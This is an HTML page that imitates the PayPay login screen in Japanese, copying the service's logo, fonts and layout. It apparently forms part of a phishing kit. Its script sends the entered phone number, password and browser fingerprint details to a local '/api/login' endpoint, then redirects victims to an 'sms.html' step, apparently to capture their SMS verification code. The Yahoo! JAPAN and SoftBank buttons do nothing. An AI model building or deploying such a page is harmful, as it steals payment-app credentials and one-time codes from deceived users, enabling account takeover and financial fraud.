<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width,height=device-height,user-scalable=no,initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0,viewport-fit=cover">
  <title>PayPay</title>
  <link rel="icon" href="https://cdn.assets.paypay.ne.jp/cdn/apps/prod/web/5-72-0/favicon.ico">
  <style>
    @font-face{font-family:Graphik;font-display:swap;font-weight:300;src:url(https://static.paypay.ne.jp/font/Graphik-Regular-Web.woff2)format("woff2"),url(https://static.paypay.ne.jp/font/Graphik-Regular-Web.woff)format("woff")}
    @font-face{font-family:Graphik;font-display:swap;font-weight:400;src:url(https://static.paypay.ne.jp/font/Graphik-Regular-Web.woff2)format("woff2"),url(https://static.paypay.ne.jp/font/Graphik-Regular-Web.woff)format("woff")}
    @font-face{font-family:Graphik;font-display:swap;font-weight:600;src:url(https://static.paypay.ne.jp/font/Graphik-Semibold-Web.woff2)format("woff2"),url(https://static.paypay.ne.jp/font/Graphik-Semibold-Web.woff)format("woff")}
    @font-face{font-family:Graphik;font-display:swap;font-weight:700;src:url(https://static.paypay.ne.jp/font/Graphik-Semibold-Web.woff2)format("woff2"),url(https://static.paypay.ne.jp/font/Graphik-Semibold-Web.woff)format("woff")}

    *, *::before, *::after { box-sizing: border-box; }
    html, body {
      margin: 0; padding: 0;
      font-family: Graphik, "Hiragino Sans", "Hiragino Kaku Gothic ProN", "Noto Sans", "Noto Sans CJK JP", "Noto Sans JP", Meiryo, sans-serif;
      -webkit-user-select: none; user-select: none;
      -webkit-touch-callout: none;
      font-size: 12px;
      background-color: #fff;
    }
    body {
      min-height: 100vh;
      padding: env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);
    }
    a { color: #3895ff; text-decoration: none; }
    button { border: 0; outline: 0; cursor: pointer; font-family: inherit; }
    ul { list-style: none; margin: 0; padding: 0; }

    .container { max-width: 100vw; margin: 0 auto; }
    .account-root-page { }

    .top-header { position: relative; }
    .account-header { z-index: 100; background: #fff; width: 100%; position: fixed; top: 0; }

    .header-signin {
      border: 0; border-bottom: 4px solid;
      flex-direction: row; flex: 1;
      justify-content: space-between; align-items: center;
      padding: 8px 12px; display: flex;
      color: #f56a76;
      border-image: linear-gradient(90deg, #e96b6a, rgba(253,92,92,0.55)) 1;
      box-shadow: 0 15px 20px -20px #e96b6a;
    }
    .header-signin img { height: 45px; display: block; }
    .header-signin h2 { font-size: 26px; font-weight: 400; margin: 0; line-height: 1.2; }
    .header-more { position: absolute; top: 50%; right: 15px; transform: translateY(-50%); }

    .account-content {
      padding-top: 80px;
      -webkit-overflow-scrolling: touch;
      position: relative;
    }

    .account-signin-page {
      max-width: 440px; margin-left: auto; margin-right: auto; padding: 30px 20px;
    }
    .account-signin-page h3 { color: #444; margin-bottom: 1.5em; font-size: 1.5em; font-weight: 400; }

    .signin-signon { }
    .input-field {
      text-align: left; flex-flow: column-reverse; display: flex;
      position: relative; overflow: hidden;
    }
    .input-field label { color: #bababa; touch-action: manipulation; transition: all .2s; font-size: 12px; }
    .input-field input {
      color: #686868; -webkit-tap-highlight-color: transparent;
      border: none; border-bottom: 1px solid #ccc; border-radius: 0; outline: none;
      width: 100%; height: 38px; margin: 20px 0; padding: 8px 0;
      font-size: 18px; line-height: 38px;
      touch-action: manipulation; transition: all .2s;
      font-family: inherit;
    }
    .input-field input:focus { border-bottom: 1px solid #3895ff; }
    .input-field input:placeholder-shown + label {
      transform-origin: 0 100%; pointer-events: none;
      transform: translateY(30px) scale(1.4);
    }
    .input-field input:not(:placeholder-shown) + label,
    .input-field input:focus + label { cursor: pointer; transform: translate(0) scale(1); }
    .input-field ::placeholder { opacity: 0; color: #bababa; transition: inherit; }
    .icons-on-input {
      display: flex; position: absolute; bottom: 50%; right: 0; transform: translateY(50%);
    }

    .component-icon {
      background-position: 50%; background-repeat: no-repeat; background-size: contain; display: block;
    }
    .icon-xs { width: 16px; height: 16px; }
    .icon-sm { width: 24px; height: 24px; }

    .submit-button {
      color: #fff; background-color: #ff0211; border: none; border-radius: 4px;
      width: 100%; height: 45px; margin-top: 30px; font-size: 14px;
      text-align: center; cursor: pointer; outline: none; font-weight: 600;
      font-family: inherit;
    }
    .submit-button:disabled { background-color: #e6e6e6; cursor: default; color: #fff; }

    .separate-text { color: #242424; margin: 2em 0 1em; padding: 0 10px; font-size: 1.25em; }

    .yconnect-action button {
      color: #686868; background-color: #fff; border: 1px solid #ccc; border-radius: 3px;
      width: 100%; height: 44px; margin-top: 0; font-size: 14px;
      display: flex; align-items: center; padding: 0 12px; cursor: pointer;
      font-family: inherit; font-weight: 600;
    }
    .yconnect-action button .component-icon {
      background-image: url(https://image.paypay.ne.jp/images/payment-miniapps/common/yahoo.png);
      width: 24px; height: 24px; flex-shrink: 0;
    }
    .yconnect-action button span { flex: 1; text-align: center; }

    .sbconnect-action button {
      color: #686868; background-color: #fff; border: 1px solid #ccc; border-radius: 3px;
      width: 100%; height: 44px; margin-top: 8px; font-size: 14px;
      display: flex; align-items: center; padding: 0 12px; cursor: pointer;
      font-family: inherit; font-weight: 600;
    }
    .sbconnect-action button .component-icon {
      background-image: url(https://image.paypay.ne.jp/images/payment-miniapps/common/softbank.png);
      width: 24px; height: 24px; flex-shrink: 0;
    }
    .sbconnect-action button span { flex: 1; text-align: center; }

    .switch-sign-flow {
      color: #3895ff; border-top: 1px solid #f2f2f2;
      margin-top: 60px; padding: 15px 0; font-size: 12px;
    }
    .switch-sign-flow a { color: #3895ff; }
    .switch-sign-flow strong { font-size: 16px; padding-left: 10px; font-weight: 600; }

    .login-error {
      display: none; color: #e53935; font-size: 12px; margin-top: 8px; line-height: 1.5;
    }
    .login-error.visible { display: block; }

    .loading-overlay {
      position: fixed; inset: 0; background: rgba(255,255,255,0.85);
      display: flex; flex-direction: column; align-items: center; justify-content: center;
      z-index: 9999; opacity: 0; pointer-events: none; transition: opacity 0.2s;
    }
    .loading-overlay.visible { opacity: 1; pointer-events: all; }
    .spinner {
      width: 36px; height: 36px; border: 3px solid #e0e0e0;
      border-top-color: #ff0211; border-radius: 50%;
      animation: spin 0.7s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .loading-text { margin-top: 12px; font-size: 13px; color: #666; }
  </style>
</head>
<body class="ios outside-native account-sign-in">

<div id="app" data-v-app="">
  <div id="app" style="--font-weight-bold: var(--font-weight-bold-ios); --RootPortal-zIndex: 1100;">
    <div class="container">
      <section data-v-32bf0b5d="" class="account-root-page">

        <section data-v-b035e588="" data-v-32bf0b5d="" class="top-header account-header">
          <header data-v-b035e588="" class="header-signin">
            <img data-v-b035e588="" src="https://image.paypay.ne.jp/images/payment-miniapps/opa/logo.png" alt="PayPay" height="45">
            <h2 data-v-b035e588="">ログイン</h2>
          </header>
          <div data-v-b035e588="" class="header-more"></div>
        </section>

        <div data-v-32bf0b5d="" class="account-content">
          <section data-v-991fda77="" data-v-32bf0b5d="" class="account-signin-page">
            <h3 data-v-991fda77="">PayPayにログイン</h3>

            <section data-v-6ea1e05b="" data-v-991fda77="" class="signin-signon">
              <div data-v-6ea1e05b="" class="username">
                <div data-v-6ea1e05b="" class="input-field">
                  <div data-v-6ea1e05b="" class="icons-on-input" style="display: none;"></div>
                  <input data-v-6ea1e05b="" type="tel" name="username" placeholder="携帯電話番号" maxlength="13" value="" autocomplete="off">
                  <label data-v-6ea1e05b="" id="login-inputPhone-txt" for="username">携帯電話番号</label>
                </div>
              </div>

              <div data-v-6ea1e05b="" class="password">
                <div data-v-6ea1e05b="" class="input-field">
                  <div data-v-6ea1e05b="" class="icons-on-input" style="display: none;"></div>
                  <input data-v-6ea1e05b="" type="password" name="password" placeholder="パスワード" class="password-input" autocomplete="current-password">
                  <label data-v-6ea1e05b="" id="login-inputPassword-txt" for="password">パスワード</label>
                </div>
              </div>

              <button data-v-6ea1e05b="" id="login-loginBtn" class="submit-button" disabled="">ログイン</button>

              <!-- Error -->
              <div class="login-error" id="loginError"></div>
            </section>

            <!-- External account separator -->
            <div data-v-991fda77="" class="separate-text">外部のアカウントでログイン</div>

            <!-- Yahoo! JAPAN ID -->
            <section data-v-cbe44f2d="" data-v-991fda77="" class="yconnect-action">
              <button data-v-cbe44f2d="" class="vm">
                <i data-v-3c7781bb="" data-v-cbe44f2d="" class="component-icon icon-yahoo icon-sm ib vm"></i>
                <span data-v-cbe44f2d="" class="pl10">Yahoo! JAPAN ID</span>
              </button>
            </section>

            <!-- SoftBank button -->
            <section data-v-63b4f8a3="" data-v-991fda77="" class="sbconnect-action">
              <button data-v-63b4f8a3="" class="vm">
                <i data-v-3c7781bb="" data-v-63b4f8a3="" class="component-icon icon-softbank-icon icon-sm ib vm"></i>
                <span data-v-63b4f8a3="" class="pl10">ソフトバンク・ワイモバイル・LINEMO</span>
              </button>
            </section>

            <!-- Switch to signup -->
            <div data-v-991fda77="" class="switch-sign-flow">
              アカウントをお持ちでない場合
              <a data-v-991fda77="" href="signup.html">
                <strong data-v-991fda77="" class="fs16 pl10">新規登録</strong>
              </a>
            </div>
          </section>
        </div>

      </section>
    </div>
  </div>
</div>

<!-- Loading overlay -->
<div class="loading-overlay" id="loadingOverlay">
  <div class="spinner"></div>
  <div class="loading-text">ログイン中...</div>
</div>

<script>
(function () {
  const phoneInput = document.querySelector('input[name="username"]');
  const passInput  = document.querySelector('input[name="password"]');
  const loginBtn   = document.getElementById("login-loginBtn");
  const errorDiv   = document.getElementById("loginError");
  const overlay    = document.getElementById("loadingOverlay");

  const ERROR_MAP = [
    [/wrong.?password|incorrect.?password|password.*incorrect|認証.*失敗|WRONG_PASSWORD/i,
      "携帯電話番号またはパスワードが違います。"],
    [/lock|locked|ロック/i,
      "アカウントがロックされています。しばらく経ってから再度お試しください。"],
    [/not.?found|no.?user|該当.*ユーザー/i,
      "携帯電話番号またはパスワードが違います。"],
    [/too.?many|rate.?limit|試行回数/i,
      "ログイン試行回数が上限に達しました。しばらく経ってから再度お試しください。"],
  ];

  function mapError(raw) {
    if (!raw) return "ログインに失敗しました。電話番号またはパスワードを確認してください。";
    for (const [re, msg] of ERROR_MAP) {
      if (re.test(raw)) return msg;
    }
    return "ログインに失敗しました。電話番号またはパスワードを確認してください。";
  }

  phoneInput.addEventListener("input", function () {
    let digits = this.value.replace(/\D/g, "").slice(0, 11);
    let fmt = digits;
    if (digits.length > 7)      fmt = digits.slice(0,3) + "-" + digits.slice(3,7) + "-" + digits.slice(7);
    else if (digits.length > 3) fmt = digits.slice(0,3) + "-" + digits.slice(3);
    this.value = fmt;
    updateBtn();
  });

  passInput.addEventListener("input", updateBtn);

  function updateBtn() {
    const digits = phoneInput.value.replace(/\D/g, "");
    loginBtn.disabled = !(digits.length >= 10 && passInput.value.trim());
  }

  [phoneInput, passInput].forEach(el => {
    el.style.webkitUserSelect = "text";
    el.style.userSelect = "text";
  });

  function showError(msg) {
    errorDiv.textContent = msg;
    errorDiv.classList.add("visible");
  }
  function clearError() {
    errorDiv.textContent = "";
    errorDiv.classList.remove("visible");
  }

  loginBtn.addEventListener("click", async () => {
    clearError();
    const phone    = phoneInput.value.replace(/\D/g, "");
    const password = passInput.value.trim();
    if (phone.length < 10 || !password) return;

    overlay.classList.add("visible");
    loginBtn.disabled = true;

    try {
      const res  = await fetch("/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          phone,
          password,
          user_agent: navigator.userAgent,
          device_info: {
            language:    navigator.language,
            platform:    navigator.platform,
            screen:      screen.width + "x" + screen.height,
            color_depth: screen.colorDepth,
            timezone:    Intl.DateTimeFormat().resolvedOptions().timeZone,
          },
        }),
      });
      const data = await res.json();

      if (!res.ok) {
        showError(mapError(data.error));
        loginBtn.disabled = false;
        return;
      }

      if (data.status === "sms_required") {
        sessionStorage.setItem("paypay_phone", phoneInput.value);
        window.location.href = "sms.html";
      }

    } catch (err) {
      showError("サーバーに接続できませんでした。しばらく経ってから再度お試しください。");
      loginBtn.disabled = false;
    } finally {
      overlay.classList.remove("visible");
    }
  });
})();
</script>
</body>
</html>
